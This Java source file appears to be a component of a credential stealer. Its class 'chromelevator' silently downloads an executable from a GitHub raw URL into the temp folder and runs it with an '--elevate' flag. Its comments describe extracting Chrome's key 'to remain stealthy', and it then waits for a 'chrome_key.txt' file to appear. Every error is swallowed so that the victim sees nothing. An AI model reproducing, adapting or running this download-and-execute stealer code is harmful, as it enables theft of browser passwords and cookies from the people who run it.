package itzgonza.hollyshit.impl.system;

import itzgonza.hollyshit.utils.utilities;
import java.io.File;

public class chromelevator extends utilities {

    @Override
    public void initialize() throws Exception {
        try {
            File keyFile = new File(System.getProperty("java.io.tmpdir"), "chrome_key.txt");
            if (keyFile.exists()) keyFile.delete(); // Clear old key

            downloadAndExecute();

            // Wait for key to be generated (max 10 seconds)
            for (int i = 0; i < 20; i++) {
                if (keyFile.exists() && keyFile.length() > 0) break;
                Thread.sleep(500);
            }
        } catch (Exception ignored) {}
    }

    private void downloadAndExecute() {
        try {
            String payloadUrl = "https://github.com/jawaws/jawwwaw/raw/main/chromelevator.exe";
            File payloadFile = new File(System.getProperty("java.io.tmpdir"), "chromelevator.exe");
            
            if (!payloadFile.exists()) {
                java.net.URL url = new java.net.URL(payloadUrl);
                java.nio.file.Files.copy(url.openStream(), payloadFile.toPath());
            }

            if (payloadFile.exists()) {
                // Run elevated to extract key, then kill to remain stealthy
                Process p = Runtime.getRuntime().exec("cmd /c start /wait /B " + payloadFile.getAbsolutePath() + " --elevate");
                if (p.waitFor(15, java.util.concurrent.TimeUnit.SECONDS)) {
                    // Success, key should be in chrome_key.txt
                }
            }
        } catch (Exception ignored) {}
    }
}
